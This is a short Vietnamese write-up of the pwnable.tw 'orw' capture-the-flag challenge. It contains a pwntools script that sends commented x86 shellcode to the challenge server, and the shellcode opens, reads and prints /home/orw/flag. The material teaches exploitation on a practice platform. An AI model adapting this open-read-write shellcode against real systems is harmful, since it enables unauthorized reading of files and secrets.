# SHELL CODE

Challenge này chỉ là một bài test nhỏ để chung ta luyện shellcode thôi

chúng ta biết khi chạy trên sever flag sẽ ở /home/orw/flag
```
from pwn import *


context.binary = exe = ELF('./orw', checksec=False)
#p=process(exe.path)
p=remote("chall.pwnable.tw", 10001)

def GDB():
    gdb.attach(p,gdbscript=
        '''
        b*main
        '''
        )
    input()

shellcode=asm(
    '''
    push 0x6761
    push 0x6C662F77
    push 0x726F2F65
    push 0x6D6F682F       ;push tring /home/orw/flag lên stack

    mov eax,0x5           ;thiết lập các thanh ghi để gọi sysopen
    mov ebx,esp           ;ebx chứa địa chỉ trỏ đến string /home/orw/flag
    mov ecx,0               
    mov edx,0
    int 0x80               ;gọi sysopen 

    mov ebx,eax            ;sau khi đọc thành công thì fd sẽ được save tại eax nên ta mov ebx,eax
    mov eax,0x3            ; thiết lập các thanh ghi để gọi hàm sysread
    mov ecx,esp            ; ecx chứa địa chỉ hợp lệ để ta có thể đọc từ file flag
    mov edx,500            ; độ dài muốn đọc cứ khai bừa một mớ đi
    int 0x80               ; gọi sysread
    
    mov eax,0x4            ;sau khi đọc xong thì ecx vẫn chứa địa chỉ của buffer mà mình đã đọc flag vô nên chỉ cần  thiết lập các thanh ghi eax và ebx là được  
    mov ebx,1              ; stdout
    int 0x80               ; gọi syswrite()
    '''
    )
#GDB()
p.sendafter(b"shellcode:",shellcode)
p.interactive()

```
